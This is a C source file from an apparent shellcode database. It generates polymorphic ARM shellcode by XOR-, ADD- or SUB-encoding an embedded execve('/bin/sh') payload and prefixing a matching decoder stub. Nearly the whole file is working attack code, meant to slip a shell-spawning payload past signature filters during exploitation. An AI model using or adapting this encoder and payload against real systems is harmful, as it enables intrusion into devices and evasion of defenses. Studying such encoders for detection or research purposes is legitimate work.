/*
Title:     Generator polymorphic shellcode on ARM architecture
Date:      2010-07-07
Tested on: ARM926EJ-S rev 5 (v5l)

Author:    Jonathan Salwan
Web:       http://shell-storm.org | http://twitter.com/jonathansalwan

! Database of shellcodes http://www.shell-storm.org/shellcode/

Credit
======
This code generates a shellcode polymorphic execve("/bin/sh", ["/bin/sh"], NULL)
on ARM architecture.

You can encode your shellcode with XOR, ADD, SUB
*/



#include <stdio.h>
#include <stdio.h>

/* execve("/bin/sh", ["/bin/sh"], NULL); */

unsigned char your_SC[] = "\x01\x30\x8f\xe2"
                          "\x13\xff\x2f\xe1"
                          "\x78\x46\x0a\x30"
                          "\x01\x90\x01\xa9"
                          "\x92\x1a\x0b\x27"
                          "\x01\xdf\x2f\x2f"
                          "\x62\x69\x6e\x2f"
                          "\x73\x68";


void syntax(void)
{
	fprintf(stdout,"\nSyntax:  ./encode <type> <value>\n\n");
	fprintf(stdout,"Type:    -xor\n");
	fprintf(stdout,"         -add\n");
	fprintf(stdout,"         -sub\n\n");
	fprintf(stdout,"Exemple: ./encode -xor 20\n\n");
	exit(1);
}

int main(int argc, char *argv[])
{
	if(argc != 3){
		syntax();
		return 1;
		}


	if(!strcmp(argv[1], "-xor"))
		{
		fprintf(stdout,"Encode : XOR %s\n", argv[2]);
		fprintf(stdout,"Encoded: \n");

		int num  = (256-strlen(your_SC))+1;
		int num2 = num + 1;

		fprintf(stdout, "\\x24\\x60\\x8f\\xe2"
            			"\\x16\\xff\\x2f\\xe1"
            			"\\x%.2x\\x40\\xa0\\xe3"
            			"\\x01\\x0c\\x54\\xe3"
            			"\\x1e\\xff\\x2f\\x81"
            			"\\x%.2x\\x40\\x44\\xe2"
            			"\\x04\\x50\\xde\\xe7"
            			"\\x%.2x\\x50\\x25\\xe2"
            			"\\x04\\x50\\xce\\xe7"
            			"\\x%.2x\\x40\\x84\\xe2"
            			"\\xf7\\xff\\xff\\xea"
            			"\\xf5\\xff\\xff\\xeb"
				,num, num, atoi(argv[2]), num2);

		for (int i=0;i<sizeof(your_SC)-1;i++){
			your_SC[i] = your_SC[i]^atoi(argv[2]);
			fprintf(stdout,"\\x%.2x", your_SC[i]);
			}
		fprintf(stdout,"\n");
		}


        if(!strcmp(argv[1], "-add"))
                {
                fprintf(stdout,"Encode : ADD %s\n", argv[2]);
                fprintf(stdout,"Encoded: \n");

                int num  = (256-strlen(your_SC))+1;
                int num2 = num + 1;

                fprintf(stdout, "\\x24\\x60\\x8f\\xe2"
                                "\\x16\\xff\\x2f\\xe1"
                                "\\x%.2x\\x40\\xa0\\xe3"
                                "\\x01\\x0c\\x54\\xe3"
                                "\\x1e\\xff\\x2f\\x81"
                                "\\x%.2x\\x40\\x44\\xe2"
                                "\\x04\\x50\\xde\\xe7"
                                "\\x%.2x\\x50\\x45\\xe2"
                                "\\x04\\x50\\xce\\xe7"
                                "\\x%.2x\\x40\\x84\\xe2"
                                "\\xf7\\xff\\xff\\xea"
                                "\\xf5\\xff\\xff\\xeb"
                                ,num, num, atoi(argv[2]), num2);

                for (int i=0;i<sizeof(your_SC)-1;i++){
                        your_SC[i] = your_SC[i]+atoi(argv[2]);
                        fprintf(stdout,"\\x%.2x", your_SC[i]);
                        }
                fprintf(stdout,"\n");
                }

        if(!strcmp(argv[1], "-sub"))
                {
                fprintf(stdout,"Encode : SUB %s\n", argv[2]);
                fprintf(stdout,"Encoded: \n");

                int num  = (256-strlen(your_SC))+1;
                int num2 = num + 1;

                fprintf(stdout, "\\x24\\x60\\x8f\\xe2"
                                "\\x16\\xff\\x2f\\xe1"
                                "\\x%.2x\\x40\\xa0\\xe3"
                                "\\x01\\x0c\\x54\\xe3"
                                "\\x1e\\xff\\x2f\\x81"
                                "\\x%.2x\\x40\\x44\\xe2"
                                "\\x04\\x50\\xde\\xe7"
                                "\\x%.2x\\x50\\x85\\xe2"
                                "\\x04\\x50\\xce\\xe7"
                                "\\x%.2x\\x40\\x84\\xe2"
                                "\\xf7\\xff\\xff\\xea"
                                "\\xf5\\xff\\xff\\xeb"
                                ,num, num, atoi(argv[2]), num2);

                for (int i=0;i<sizeof(your_SC)-1;i++){
                        your_SC[i] = your_SC[i]-atoi(argv[2]);
                        fprintf(stdout,"\\x%.2x", your_SC[i]);
                        }
                fprintf(stdout,"\n");
                }

return 0;
}